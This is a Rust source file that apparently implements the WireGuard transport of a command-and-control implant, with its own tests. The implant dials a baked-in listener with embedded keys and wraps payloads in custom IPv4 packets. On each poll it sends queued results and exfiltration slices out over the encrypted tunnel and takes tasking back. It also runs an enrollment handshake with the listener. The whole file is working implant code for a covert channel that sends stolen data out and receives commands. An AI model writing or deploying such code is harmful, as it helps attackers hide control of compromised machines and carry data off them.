use std::net::UdpSocket;
use std::time::Duration;

use base64::Engine;
use boringtun::noise::{Tunn, TunnResult};
use boringtun::x25519;

use super::Contact;
use crate::error::ContactError;
use crate::profile::Profile;
use crate::session::{Attempt, Session};

// The WireGuard carriage (architecture.md Sec 8, Sec 15.3 ADR-004 as
// amended): the envelope's own contact frames and seal riding
// WireGuard-encrypted UDP. One datagram is one poll contact -- the request
// payload is the envelope body the HTTP route also carries, the answer the
// same composition sealed back over the session the contact's handshake
// opened. The tunnel is the client shape: the implant initiates against
// the listener's baked server key, its own static key the per-artifact
// half the build minted and registered on the listener at build time.
//
// The inner carriage is a minimal IPv4 packet (protocol 253, the
// experimental/testing allocation): boringtun's paths validate the inner
// header, so the wrap is the contract both sides share, and the marker
// protocol keeps the carriage self-describing on either end.
//
// The bake carries three facts this carriage reads: the wg:// dial (the
// listener's host and port), the artifact's private key half, and the
// listener's public key. A dial without usable keys is a bind failure --
// the run loop's walk treats it as a dropped cycle, never a plaintext
// fallback.

/// The inner carriage's IP protocol marker (RFC 3692 experimental range),
/// the native router's own constant.
const INNER_PROTOCOL: u8 = 253;

/// One datagram's room, the WireGuard bound both sides size buffers to.
const MAX_PACKET: usize = 65535;

/// How many handshake rounds one exchange may drive: an initiation, its
/// answer, and a bounded retransmission. A tunnel that cannot stand in
/// that budget is a dropped attempt -- the cadence retries.
const HANDSHAKE_ROUNDS: usize = 3;

/// One datagram wait's read budget per round: decapsulate drains follow-up
/// network output (a keepalive, the queued payload's flush) and each drain
/// step may need another datagram.
const DRAIN_STEPS: usize = 8;

pub struct WireGuard {
    address: String,
    private: [u8; 32],
    server: [u8; 32],
    timeout: Duration,
    tunnel: Option<Tunnel>,
}

impl WireGuard {
    pub fn new(dial: &str, profile: &Profile) -> WireGuard {
        let rest = dial.strip_prefix("wg://").unwrap_or(dial);
        let address = rest.split('/').next().unwrap_or(rest).to_string();
        WireGuard {
            address,
            private: parse_key(&profile.wg_private_key).unwrap_or([0u8; 32]),
            server: parse_key(&profile.wg_server_key).unwrap_or([0u8; 32]),
            timeout: Duration::from_secs_f64(profile.request_timeout_seconds.max(1.0)),
            tunnel: None,
        }
    }

    /// The tunnel this contact runs over, standing across contacts so the
    /// handshake pays once. Rebuilt per carriage: the run loop constructs a
    /// fresh carriage per walked dial, and a fresh tunnel re-handshakes.
    fn tunnel(&mut self) -> Result<&mut Tunnel, ContactError> {
        if self.tunnel.is_none() {
            self.tunnel = Some(Tunnel::open(
                &self.address,
                self.private,
                self.server,
                self.timeout,
            )?);
        }
        Ok(self.tunnel.as_mut().expect("just built"))
    }

    /// The poll shape, the raw-TCP carriage's own: the request datagram
    /// carries the handshake, the staged demands at their seams, the
    /// accumulated batch, and the exfil run slices the datagram budget
    /// admits; the answer datagram carries the handshake answer and
    /// everything the composition answers behind it. The batch leaves only
    /// after a processed answer, so a dropped datagram re-sends it
    /// verbatim on the next cycle.
    fn attempt_poll(&mut self, session: &mut Session) -> Result<Attempt, ContactError> {
        session.drain_channels();
        let demands = session.staged_demands();
        let batch = session.outbox.batch();
        let exfil = session.exfil_frames(crate::session::EXFIL_CONTACT_BUDGET);
        let mut frames = Vec::with_capacity(1 + demands.len() + batch.len() + exfil.len());
        frames.push(session.handshake_frame());
        frames.extend(demands);
        frames.extend(batch.iter().cloned());
        frames.extend(exfil);
        let (body, _) = session.encode_outgoing(&frames);

        let tunnel = self.tunnel()?;
        let answer = tunnel.exchange(&body)?;

        let inbound = session
            .decode_incoming(&answer)
            .ok_or(ContactError::Protocol(
                "the contact answer did not verify under the baked key",
            ))?;
        let first = inbound.first().ok_or(ContactError::Protocol(
            "the contact answer carried no frames",
        ))?;
        let (acks, attempt) = session
            .handshake_answered(first)
            .map_err(ContactError::Protocol)?;
        if let Attempt::Refused = attempt {
            return Ok(attempt);
        }
        session.outbox.batch_crossed(batch.len());
        super::http::accept_staged(session, &inbound);
        super::accept_tasking(session, &inbound[1..], acks);
        session.drain_channels();
        session.staged_cycle_end();
        session.exfil_cycle_end();
        Ok(Attempt::Crossed)
    }
}

impl Contact for WireGuard {
    fn attempt(&mut self, session: &mut Session) -> Result<Attempt, ContactError> {
        self.attempt_poll(session)
    }
}

/// One client tunnel over one connected socket: the boringtun state plus
/// the exchange discipline -- encapsulate out, decapsulate in, every
/// network output the state produces going back out on the socket (a
/// handshake retry, a keepalive, the queued payload's flush after the
/// handshake response lands).
pub struct Tunnel {
    socket: UdpSocket,
    tunn: Tunn,
}

impl Tunnel {
    pub fn open(
        address: &str,
        private: [u8; 32],
        server: [u8; 32],
        timeout: Duration,
    ) -> Result<Tunnel, ContactError> {
        let socket = UdpSocket::bind("0.0.0.0:0")
            .map_err(|e| ContactError::Transport(format!("wg bind: {e}")))?;
        socket
            .connect(address)
            .map_err(|e| ContactError::Transport(format!("wg dial {address}: {e}")))?;
        socket
            .set_read_timeout(Some(timeout))
            .map_err(|e| ContactError::Transport(e.to_string()))?;
        let tunn = Tunn::new(
            x25519::StaticSecret::from(private),
            x25519::PublicKey::from(server),
            None,
            None,
            0,
            None,
        );
        Ok(Tunnel { socket, tunn })
    }

    /// One exchange: the payload out as the tunnel's data, the answer's
    /// inner payload back. A session that does not stand yet (or expired
    /// between contacts) drives the handshake inside the same budget -- the
    /// encapsulated payload queues behind boringtun's initiation and
    /// flushes once the response lands.
    pub fn exchange(&mut self, payload: &[u8]) -> Result<Vec<u8>, ContactError> {
        let packet = wrap_inner(payload);
        for _ in 0..HANDSHAKE_ROUNDS {
            let mut out = [0u8; MAX_PACKET];
            match self.tunn.encapsulate(&packet, &mut out) {
                TunnResult::WriteToNetwork(written) => {
                    self.send(written)?;
                }
                _ => {
                    return Err(ContactError::Protocol(
                        "the tunnel refused the contact payload",
                    ))
                }
            }
            if let Some(answer) = self.drain()? {
                return Ok(answer);
            }
        }
        Err(ContactError::Transport(
            "the tunnel handshake did not complete".to_string(),
        ))
    }

    /// Waits and decapsulates until one inner payload arrives: every
    /// network output the state emits goes back out (the drain contract),
    /// and a read timeout is a dropped attempt -- None, the caller's retry
    /// budget decides.
    fn drain(&mut self) -> Result<Option<Vec<u8>>, ContactError> {
        let mut datagram = [0u8; MAX_PACKET];
        let mut scratch = [0u8; MAX_PACKET];
        for _ in 0..DRAIN_STEPS {
            let received = match self.socket.recv(&mut datagram) {
                Ok(count) => &datagram[..count],
                Err(e)
                    if matches!(
                        e.kind(),
                        std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut
                    ) =>
                {
                    return Ok(None)
                }
                Err(e) => return Err(ContactError::Transport(e.to_string())),
            };

            let mut feed = Some(received);
            for _ in 0..4 {
                let src = feed.take().unwrap_or(&[]);
                match self.tunn.decapsulate(None, src, &mut scratch) {
                    TunnResult::WriteToNetwork(written) => {
                        self.send(written)?;
                        feed = Some(&[]);
                    }
                    TunnResult::WriteToTunnelV4(inner, _)
                    | TunnResult::WriteToTunnelV6(inner, _) => {
                        if let Some(payload) = unwrap_inner(inner) {
                            return Ok(Some(payload.to_vec()));
                        }
                        feed = Some(&[]);
                    }
                    _ => break,
                }
            }
        }
        Ok(None)
    }

    fn send(&mut self, datagram: &[u8]) -> Result<(), ContactError> {
        self.socket
            .send(datagram)
            .map(|_| ())
            .map_err(|e| ContactError::Transport(e.to_string()))
    }
}

/// The enrollment exchange over the tunnel (Sec 8, the stream carriage's
/// full-independence step on the datagram discipline): one EnrollRequest
/// frame out -- sealed under the bake's key with the enroll purpose tag,
/// no counter -- one EnrollResponse frame back. The tunnel is
/// short-lived: enrollment is a one-shot exchange, and the poll carriage
/// builds its own.
pub fn enroll_over_wireguard(
    url: &str,
    profile: &Profile,
    keys: &crate::enroll::KeyPair,
) -> Result<crate::enroll::Enrollment, String> {
    use prost::Message;

    let rest = url.strip_prefix("wg://").unwrap_or(url);
    let authority = rest.split('/').next().unwrap_or(rest);
    let private = parse_key(&profile.wg_private_key).ok_or_else(|| {
        "enroll transport: the bake carries no usable WireGuard key pair".to_string()
    })?;
    let server = parse_key(&profile.wg_server_key)
        .ok_or_else(|| "enroll transport: the bake carries no usable listener key".to_string())?;
    let timeout = Duration::from_secs_f64(profile.request_timeout_seconds.max(1.0));
    let mut tunnel = Tunnel::open(authority, private, server, timeout)
        .map_err(|e| format!("enroll transport: {e}"))?;

    let request = crate::enroll::wire_enroll_request(profile, keys);
    let frames = crate::wire::encode(&[crate::wire::Frame {
        payload: request.encode_to_vec(),
        kind: crate::wire::FrameKind::EnrollRequest as i32,
    }]);
    let body = match crate::envelope::parse_baked_key(&profile.envelope_key) {
        Some((key_id, key)) if profile.contact_envelope == "aesgcm" => {
            crate::envelope::seal_contact_body(
                &frames,
                &key_id,
                &key,
                crate::envelope::SOCKET_ENROLL_REQUEST_AAD,
            )
        }
        _ => frames,
    };
    let answer = tunnel
        .exchange(&body)
        .map_err(|e| format!("enroll transport: {e}"))?;

    let plain = match crate::envelope::parse_baked_key(&profile.envelope_key) {
        Some((key_id, key)) if profile.contact_envelope == "aesgcm" => {
            crate::envelope::try_open_contact_body(
                &answer,
                &key_id,
                &key,
                crate::envelope::SOCKET_ENROLL_RESPONSE_AAD,
            )
            .ok_or_else(|| "enroll answer did not verify under the baked key".to_string())?
        }
        _ => answer,
    };
    let frames = crate::wire::parse(&plain)
        .ok_or_else(|| "enroll answer was not valid framing".to_string())?;
    let response = frames
        .iter()
        .find(|frame| frame.kind() == crate::wire::FrameKind::EnrollResponse)
        .and_then(|frame| crate::wire::EnrollResponse::decode(frame.payload.as_ref()).ok())
        .ok_or_else(|| "enroll answer carried no EnrollResponse frame".to_string())?;
    crate::enroll::enrollment_from_response(response)
}

/// A baked WireGuard key half: base64 of exactly 32 bytes.
fn parse_key(text: &str) -> Option<[u8; 32]> {
    let decoded = base64::engine::general_purpose::STANDARD
        .decode(text.trim())
        .ok()?;
    decoded.try_into().ok()
}

/// Wraps a payload as the carriage's minimal IPv4 packet: protocol 253,
/// honest total length, addresses in the documentation range -- the native
/// router's own wrap, byte for byte.
fn wrap_inner(payload: &[u8]) -> Vec<u8> {
    let total = 20 + payload.len();
    let mut packet = vec![0u8; 20];
    packet[0] = 0x45;
    packet[2..4].copy_from_slice(&(total as u16).to_be_bytes());
    packet[4..6].copy_from_slice(&0x524fu16.to_be_bytes()); // "RO"
    packet[6..8].copy_from_slice(&0x4431u16.to_be_bytes()); // "D1"
    packet[8] = 64;
    packet[9] = INNER_PROTOCOL;
    packet[12..16].copy_from_slice(&[10, 254, 0, 1]);
    packet[16..20].copy_from_slice(&[10, 254, 0, 2]);
    packet.extend_from_slice(payload);
    packet
}

/// Strips the carriage's IPv4 wrap; None when the bytes are not this
/// carriage's shape (short header, wrong version, wrong protocol).
fn unwrap_inner(packet: &[u8]) -> Option<&[u8]> {
    if packet.len() < 20 || packet[0] >> 4 != 4 || packet[9] != INNER_PROTOCOL {
        return None;
    }
    let total = u16::from_be_bytes([packet[2], packet[3]]) as usize;
    let end = total.min(packet.len());
    (end > 20).then(|| &packet[20..end])
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_inner_wrap_round_trips_the_native_router_expectations() {
        let payload = b"sealed contact body".to_vec();
        let packet = wrap_inner(&payload);
        assert_eq!(packet[0] >> 4, 4);
        assert_eq!(packet[9], INNER_PROTOCOL);
        assert_eq!(
            u16::from_be_bytes([packet[2], packet[3]]) as usize,
            packet.len()
        );
        assert_eq!(unwrap_inner(&packet), Some(&payload[..]));
    }

    #[test]
    fn a_foreign_inner_packet_is_refused() {
        assert!(unwrap_inner(&[]).is_none());
        assert!(
            unwrap_inner(&[0x45, 0, 0, 8, 0, 0, 0, 0, 64, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0])
                .is_none()
        );
        // The protocol marker is the carriage's own: a TCP packet never reads.
        let mut tcp = wrap_inner(b"x");
        tcp[9] = 6;
        assert!(unwrap_inner(&tcp).is_none());
    }

    #[test]
    fn baked_keys_parse_the_packed_shape() {
        use base64::Engine;
        let key: Vec<u8> = (0u8..32).collect();
        let baked = base64::engine::general_purpose::STANDARD.encode(&key);
        assert_eq!(
            parse_key(&baked),
            Some((0u8..32).collect::<Vec<u8>>().try_into().unwrap())
        );
        assert_eq!(parse_key("not-base64"), None);
        assert_eq!(parse_key("AAAA"), None);
    }
}
